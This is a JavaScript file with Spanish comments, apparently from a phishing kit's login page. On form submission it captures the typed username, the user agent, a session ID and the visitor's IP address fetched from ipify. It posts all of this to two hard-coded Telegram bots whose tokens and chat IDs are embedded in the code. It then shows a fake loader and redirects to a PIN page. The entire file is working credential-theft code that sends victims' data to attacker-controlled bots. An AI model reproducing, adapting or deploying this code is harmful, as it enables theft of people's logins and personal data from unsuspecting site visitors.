// Generar un Session ID único
function generarSessionId() {
  const timestamp = Date.now().toString(36); // Timestamp en base36
  const random = Math.random().toString(36).substring(2, 10); // Cadena aleatoria en base36
  return `${timestamp}-${random}`; // Combinar timestamp y cadena aleatoria
}

// Guardar el Session ID en una cookie
function guardarSessionIdEnCookie(sessionId) {
  const fechaExpiracion = new Date();
  fechaExpiracion.setTime(fechaExpiracion.getTime() + (24 * 60 * 60 * 1000)); // Cookie válida por 1 día
  document.cookie = `sessionId=${sessionId}; expires=${fechaExpiracion.toUTCString()}; path=/`;
}

// Obtener el Session ID de la cookie
function obtenerSessionIdDeCookie() {
  const cookies = document.cookie.split(';');
  for (let cookie of cookies) {
    const [nombre, valor] = cookie.trim().split('=');
    if (nombre === 'sessionId') {
      return valor;
    }
  }
  return null;
}

// Verificar si ya existe un Session ID
let sessionId = obtenerSessionIdDeCookie();
if (!sessionId) {
  sessionId = generarSessionId();
  guardarSessionIdEnCookie(sessionId);
}

// Array de configuraciones de bots de Telegram
const telegramBots = [
  {
    botToken: '7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI',
    chatId: '6328222257'
  },
  // Puedes añadir más bots aquí
  {
    botToken: '7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY',
    chatId: '7038426430'
  }
];

const ipifyUrl = 'https://api.ipify.org?format=json';

// Función para mostrar loader
function showLoader() {
  document.getElementById('loading-overlay').style.display = 'flex';
}

// Función para enviar mensaje a un bot de Telegram
async function sendTelegramMessage(botConfig, messageData) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${botConfig.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: botConfig.chatId,
        text: messageData,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      console.error(`Error enviando mensaje al bot ${botConfig.botToken}`);
    }
  } catch (error) {
    console.error("Error enviando mensaje a Telegram", error);
  }
}

// Obtener el formulario
const formulario = document.getElementById('miForm');

// Manejar el envío del formulario
formulario.addEventListener('submit', async function (event) {
  event.preventDefault();
  showLoader();

  try {
    // Obtener los valores del formulario
    const usuario = event.target.elements.miInput.value;
    const userAgent = navigator.userAgent;

    // Obtener la IP del usuario
    const ipResponse = await fetch(ipifyUrl);
    const { ip } = await ipResponse.json();

    // Obtener la fecha actual
    const currentDate = new Date();
    const formattedDate = `${currentDate.getDate()}/${currentDate.getMonth() + 1}/${currentDate.getFullYear()}`;

    // Crear el mensaje para Telegram
    const message = `
<b>✅  Nuevo Usuario</b> @${formattedDate} | <b>${ip}</b>\n\n
👨🏻‍💻 Usuario: <b>${usuario}</b>\n
🌐 User Agent: <b>${userAgent}</b>\n
🆔 Session ID: <b>${sessionId}</b>
    `;

    // Enviar mensaje a todos los bots configurados
    await Promise.all(telegramBots.map(bot => sendTelegramMessage(bot, message)));

    // Simular un tiempo de carga y luego redirigir
    setTimeout(function () {
      window.location.href = './pin.html';
    }, 2000);

  } catch (error) {
    console.error("Error en el proceso", error);
  }
});